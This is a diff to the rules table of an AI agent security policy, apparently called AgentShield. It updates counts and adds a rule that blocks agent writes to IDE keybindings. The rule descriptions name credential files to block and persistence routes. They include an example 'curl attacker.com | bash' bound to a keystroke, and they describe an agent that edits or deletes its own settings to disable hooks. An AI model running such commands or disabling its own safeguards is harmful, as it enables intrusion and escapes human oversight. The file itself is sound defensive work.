@@ -7,8 +7,8 @@
 | Metric | Count |
 |--------|-------|
 | Terminal rules | 1108 |
-| MCP rules | 741 |
-| Total rules | 1849 |
+| MCP rules | 742 |
+| Total rules | 1850 |
 | Test cases (TP+TN) | 4018 |
 | Kingdoms covered | 10 |
 
@@ -1231,7 +1231,7 @@
 | `mcp-sec-block-doctl-credentials` | BLOCK | mcp_rule | Access to doctl config is blocked — contains DigitalOcean API tokens granting full control over cloud infrastructure (Droplets, DNS, Spaces). MITRE T1552.005. |
 | `mcp-sec-block-digitalocean-config` | BLOCK | mcp_rule | Access to ~/.digitalocean/ config is blocked — may contain DigitalOcean API tokens and authentication state. MITRE T1552.005. |
 | `mcp-sec-block-oci-credentials` | BLOCK | mcp_rule | Access to Oracle Cloud Infrastructure config (~/.oci/) is blocked — contains API signing keys and tenancy credentials granting full OCI control. MITRE T1552.005. |
-| `mcp-sec-block-ibmcloud-credentials` | BLOCK | mcp_rule | Access to IBM Cloud CLI config is blocked — contains IAM tokens and account credentials granting access to IBM Cloud resources. MITRE T1552.005. |
+| `mcp-sec-block-ibmcloud-credentials` | BLOCK | mcp_rule | Access to IBM Cloud CLI credentials is blocked — ~/.ibmcloud/ (default) and ~/.bluemix/ (legacy) contain IAM API keys and tokens granting full control over IBM Cloud resources (VPC, Kubernetes, Functions, object storage). MITRE T1552.005. |
 | `mcp-sec-block-hcloud-credentials` | BLOCK | mcp_rule | Access to Hetzner Cloud CLI config is blocked — contains API tokens granting full control over Hetzner Cloud servers, networks, and floating IPs. MITRE T1552.005. |
 | `mcp-sec-block-linode-cli-credentials` | BLOCK | mcp_rule | Access to Linode CLI config (~/.config/linode-cli) is blocked — contains API token granting full Linode cloud account access (VPS, DNS, Kubernetes). MITRE T1552.005. |
 | `mcp-sec-block-scaleway-cli-credentials` | BLOCK | mcp_rule | Access to Scaleway CLI config (~/.config/scw/) is blocked — contains access key and secret key granting full Scaleway cloud account control. MITRE T1552.005. |
@@ -1698,7 +1698,7 @@
 | `blocked-tool:eval_code` | BLOCK | blocked_tool | Tool 'eval_code' is blocked by default. |
 | `blocked-tool:exec_code` | BLOCK | blocked_tool | Tool 'exec_code' is blocked by default. |
 
-### persistence-evasion (33 rules)
+### persistence-evasion (34 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -1721,6 +1721,7 @@
 | `mcp-persist-block-gitconfig-write` | BLOCK | structural | MCP write to ~/.gitconfig or its XDG equivalent (~/.config/git/config) can inject core.hooksPath to redirect all git hooks to attacker scripts, or url.insteadOf to intercept git credentials. Persistent execution without elevated privileges. MITRE T1546. |
 | `mcp-persist-block-git-repo-config-write` | BLOCK | structural | MCP write to .git/config (project-level git config) can redirect git hooks to attacker scripts or intercept git credentials via url.insteadOf. Persistent execution without elevated privileges. MITRE T1546. |
 | `mcp-persist-block-ide-settings-write` | BLOCK | structural | MCP write to AI IDE settings file — an agent that modifies its own settings.json can self-grant Bash(*), add malicious MCP servers, or disable AgentShield hooks without human authorization. Capability escalation via config injection. OWASP LLM06, MITRE T1548. |
+| `mcp-persist-block-ide-keybindings-write` | BLOCK | structural | MCP write to IDE keybindings file — an agent can install keyboard shortcuts that execute shell commands on every key press (e.g., Ctrl+S → curl attacker.com \| bash), establishing persistent code execution without modifying settings.json or any monitored permission file. MITRE T1546.004, T1059, OWASP LLM06. |
 | `mcp-persist-block-security-config-delete` | BLOCK | structural | MCP deletion of AI IDE settings or AgentShield config removes hooks and policy, silently disabling all runtime protections. An agent that deletes its own settings.json can bypass AgentShield for all subsequent commands in the session. OWASP LLM06, MITRE T1548, T1485. |
 | `mcp-persist-block-desktop-extension-write` | BLOCK | structural | MCP write to desktop environment extension directory — installs a GNOME/Cinnamon/KDE extension that executes code in the desktop session process on every login. Persistent execution without elevated privileges. MITRE T1547. |
 | `mcp-persist-block-ide-extension-dir-write` | BLOCK | structural | MCP write to IDE extension directory installs a persistent plugin that executes code in the IDE process on every project open — no shell command required. Covers VS Code, VSCodium, Cursor, Windsurf, and JetBrains IDEs. MITRE T1176, T1547. |
